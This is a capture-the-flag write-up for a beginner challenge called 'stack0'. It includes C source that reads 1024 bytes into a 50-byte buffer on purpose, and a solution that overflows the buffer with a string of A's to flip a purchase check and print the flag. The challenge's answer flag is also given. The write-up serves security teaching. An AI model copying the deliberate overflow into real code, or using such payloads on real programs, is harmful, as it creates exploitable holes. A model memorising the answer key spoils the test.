# stack0 pt1

## Read the contents of flag1.txt.

Both a binary and a C source file were given.

```
#include <stdio.h>
#include <stdbool.h>
#include <stddef.h>
#include <string.h>
#include <unistd.h>


/* Filename of the first flag */
static const char* flagfile = "flag1.txt";

/* Send the user the contents of the first flag file. */
static void giveFlag(void) {
	char flag[64];
	FILE* fp = fopen(flagfile, "r");
	if(!fp) {
		perror(flagfile);
		return;
	}
	
	fgets(flag, sizeof(flag), fp);
	fclose(fp);
	
	printf("Here is your first flag: %s\n", flag);
}

void func(void) {
	bool didPurchase = false;
	char input[50];
	
	printf("Debug info: Address of input buffer = %p\n", input);
	
	printf("Enter the name you used to purchase this program:\n");
	read(STDIN_FILENO, input, 1024);
	
	if(didPurchase) {
		printf("Thank you for purchasing Hackersoft Powersploit!\n");
		giveFlag();
	}
	else {
		printf("This program has not been purchased.\n");
	}
}

int main(void) {
	func();
	return 0;
}

```
This challenge, almost the same as bof1, requires a simple buffer overflow to change the ```didPurchase``` variable to ```true```. Any non-zero value is interpreted as true, so any string longer than 50 characters can be used as a payload.
The address of the input buffer is essentially irrelevant.

**Solution**
```
./stack0
Debug info: Address of input buffer = 0xffbec28d
Enter the name you used to purchase this program:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thank you for purchasing Hackersoft Powersploit!
```

**Flag**
```
flag{babys_first_buffer_overflow}
```
